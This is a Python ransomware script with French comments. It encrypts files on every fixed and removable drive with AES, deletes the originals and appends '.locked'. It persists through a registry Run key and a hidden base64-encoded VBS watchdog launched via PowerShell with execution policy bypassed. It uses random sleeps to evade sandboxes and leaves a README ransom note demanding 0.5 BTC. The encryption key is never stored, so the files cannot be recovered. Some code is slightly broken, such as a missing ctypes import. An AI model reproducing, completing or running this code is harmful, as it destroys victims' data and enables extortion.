import os
import string
from pathlib import Path
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import multiprocessing
import winreg
import subprocess
import secrets
from queue import Empty
import time
import random
import base64
import psutil

vbs_template = r'''On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
target = "{script_path}"

' Éviter exécution multiple de ce même watchdog
Set colMe = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
count = 0
For Each proc In colMe
    If InStr(LCase(proc.CommandLine), LCase(WScript.ScriptName)) > 0 Then
        count = count + 1
    End If
Next
If count > 1 Then
    WScript.Quit
End If

' Sleep aléatoire initial (anti-sandbox)
Randomize
WScript.Sleep (Int((80 * Rnd) + 10) * 1000)

Do
    found = False
    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
    For Each objProcess In colProcessList
        If InStr(LCase(objProcess.CommandLine), LCase(" " & target & " ")) > 0 Or _
           Right(LCase(objProcess.CommandLine), Len(target)) = LCase(target) Then
            found = True
            Exit For
        End If
    Next

    If Not found Then
        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process -WindowStyle Hidden -FilePath 'pythonw.exe' -ArgumentList '" & target & "'""", 0, False
    End If

    WScript.Sleep 5000
Loop
'''

key = os.urandom(32)  # 256 bits

extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com", ".locked", ".vbs")

folders_exclus = [
    "windows",
    "program files",
    "program files (x86)",
    "system volume information",
    "$recycle.bin",
    ".git",
    "boot",
    "temp",
    "tmp",
    "cache",
    "appdata",
    "local",
    "microsoft",
    "programdata",
    ".vscode"
    "ransomware"
]

vbsFile = []

script_python_path = os.path.abspath(__file__)

target_dirs = [
    os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes"),
]

def deleteVbsFileAfterFinish():
    for file in vbsFile:
        try:
            if os.path.exists(file):
                os.remove(file)
                print(f"supprimer vbs avec success {file}")
            else:
                print(f"Fichier introuvable : {file}")
        except Exception as e:
            print(f"[!] Erreur suppresion watchdog dans {file}: {e}")

def is_process_running(script_path):
    for proc in psutil.process_iter(['name', 'cmdline']):
        try:
            if 'wscript.exe' in proc.info['name'].lower():
                if script_path.lower() in ' '.join(proc.info['cmdline']).lower():
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def create_watchdog_vbs():
    script_final = vbs_template.format(script_path=script_python_path.replace("\\", "\\\\"))
    b64_vbs = base64.b64encode(script_final.encode()).decode()
    DETACHED_PROCESS = 0x00000008
    CREATE_NEW_PROCESS_GROUP = 0x00000200

    for folder in target_dirs:
        try:
            if not os.path.exists(folder):
                os.makedirs(folder)
                
            
            existing_vbs = [
                f for f in os.listdir(folder)
                if f.lower().endswith('.vbs') and f.lower().startswith('watchdog_')
            ]

            if existing_vbs:
                print(f"[!] Fichier watchdog déjà présent dans {folder}, watchdog non créé.")
                vbs_exist_path = os.path.join(folder, existing_vbs[0])
                if is_process_running(vbs_exist_path):
                    print(f"[!] Watchdog déjà actif : {vbs_exist_path}")
                else:
                    subprocess.Popen(
                        ["wscript.exe", vbs_exist_path],
                        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL)

            random_name = f"watchdog_{secrets.token_hex(4)}.vbs"
            vbs_path = os.path.join(folder, random_name)
            vbsFile.append(vbs_path)

            escaped_vbs_path = vbs_path.replace("\\", "\\\\")

            #mettre vbs en memoire avec base64 
            powershell_command = (
                f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command '
                f'"$b64 = \'{b64_vbs}\'; '
                f'$vbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); '
                f'[System.IO.File]::WriteAllText(\'{escaped_vbs_path}\', $vbs); '
                f'Start-Process -WindowStyle Hidden wscript.exe \'{escaped_vbs_path}\'"'
            )
            subprocess.Popen(
                powershell_command,
                shell=True,
                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            #with open(vbs_path, "w", encoding="utf-8") as f:
            #    f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
            print(f"Watchdog créé dans {vbs_path}")
        except Exception as e:  
            print(f"Erreur création watchdog dans {folder}: {e}")

def lancer_watchdogs():
    for vbs_path in vbsFile:
        if os.path.exists(vbs_path):
            subprocess.Popen(["wscript.exe", vbs_path], shell=False)

def ajouter_run_key_vbs_relatif():
    hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
    os.makedirs(hidden_dir, exist_ok=True)

    nom_valeur = "MonScriptAuto"

    # Chemin relatif vers le script à exécuter (ici .py, mais tu peux mettre .exe ou .bat)
    current_dir = os.path.dirname(os.path.realpath(__file__))
    chemin_script_python = os.path.join(current_dir, "encoder.py")

    # Contenu du VBS (avec chemin relatif)
    vbs_template = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "pythonw.exe {chemin_script_python}", 0, False
'''

    # Encoder en Base64
    b64_vbs = base64.b64encode(vbs_template.encode()).decode()

    # Créer le fichier VBS à côté du script actuel
    chemin_script = os.path.join(hidden_dir, "theme_update.vbs")

    # Écrire le fichier VBS en le décodant depuis Base64
    with open(chemin_script, "w", encoding="utf-8") as f:
        f.write(base64.b64decode(b64_vbs).decode())

    # Ajouter au registre (Run key)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_script)
        winreg.CloseKey(key)
        print("Clé Run ajoutée avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'ajout dans le registre : {e}")

def is_in_excluded_folder(file_path: Path):
    try:
        path_parts = [part.lower() for part in file_path.resolve().parts]
        for exclu in folders_exclus:
            for part in path_parts:
                if exclu in part:
                    return True
        return False
    except Exception as e:
        print(f"Erreur exclusion sur {file_path}: {e}")
        return True  

def get_existing_root_path():
    root_paths = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:/"
        if Path(drive).exists():
            try:
                    drive_type = ctypes.windll.kernel32.GetDriveTypeW(f"{letter}:/")
                    if drive_type in [2, 3]:  # Amovible ou fixe uniquement
                        root_paths.append(drive)
                    else:
                        print(f"Ignoré (non disque ou dangereux) : {drive} (type {drive_type})")
            except Exception as e:
                    print(f"Erreur détection disque {drive} : {e}")
    return root_paths

def encrypte_file(input_file):
    backend = default_backend()
    iv = os.urandom(16)
    with open(input_file, 'rb') as f:
        data = f.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    output_file = input_file + ".locked"

    with open(output_file, 'wb') as f:
        f.write(iv + encrypted_data)

    os.remove(input_file)
    print(f"Fichier chiffré : {input_file}")
    return True

def worker(queue):
    while True:
        try:
            file = queue.get(timeout=10)
        except Empty:
            break
        if file is None:
            break
        try:
            if is_in_excluded_folder(file):
                continue
            if file.is_file() and file.suffix.lower() not in extensions_exclues :
                encrypte_file(str(file))
                # Pause aléatoire entre 0.5 et 3 secondes
                time.sleep(random.uniform(0.5, 3))
        except Exception as e:
            print(f"[!] Erreur sur {file}: {e}")

def process_par_lecteur(chemin, nb_process=2):
    chemin = Path(chemin)
    queue = multiprocessing.Queue(maxsize=100)

    processus = []
    for _ in range(nb_process):
        p = multiprocessing.Process(target=worker, args=(queue,))
        p.start()
        processus.append(p)

    for file in chemin.rglob("*"):
        try:
            queue.put(file)
        except Exception as e:
            print(f"[!] Erreur ajout fichier à la queue: {e}")

    for _ in range(nb_process):
        queue.put(None)

    while True:
        all_finished = True
        for i, p in enumerate(processus):
            if not p.is_alive():
                # Worker mort, relancer
                print(f"[!] Worker {i} mort, redémarrage...")
                # Relancer worker
                new_p = multiprocessing.Process(target=worker, args=(queue,))
                new_p.start()
                processus[i] = new_p
            else:
                all_finished = False
        if all_finished:
            break
        time.sleep(10)  # pause avant p

    for p in processus:
        p.join()
        
def afficher_ransom_note(lecteurs):
    note = """Vos fichiers ont été chiffrés.
Veuillez envoyer 0.5 BTC à l'adresse XXXXXXXX pour obtenir la clé."""
    for folder in lecteurs:
        path = os.path.join(folder, "README.txt")
        try:
            with open(path, "w") as f:
                f.write(note)
        except:
            continue

def main():
    time.sleep(random.uniform(5, 15))
    existDir = os.path.dirname(os.path.abspath(__file__))
    if existDir.lower() not in folders_exclus:
        folders_exclus.append(existDir.lower())

    ajouter_run_key_vbs_relatif()
    create_watchdog_vbs()
    lancer_watchdogs()

    lecteurs = get_existing_root_path()
    nb_cpu = multiprocessing.cpu_count()
    processus_lecteurs = []

    for lecteur in lecteurs:
        p = multiprocessing.Process(target=process_par_lecteur, args=(lecteur, nb_cpu))
        p.start()
        processus_lecteurs.append(p)

    for p in processus_lecteurs:
        p.join()

    deleteVbsFileAfterFinish()
    afficher_ransom_note(lecteurs)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()  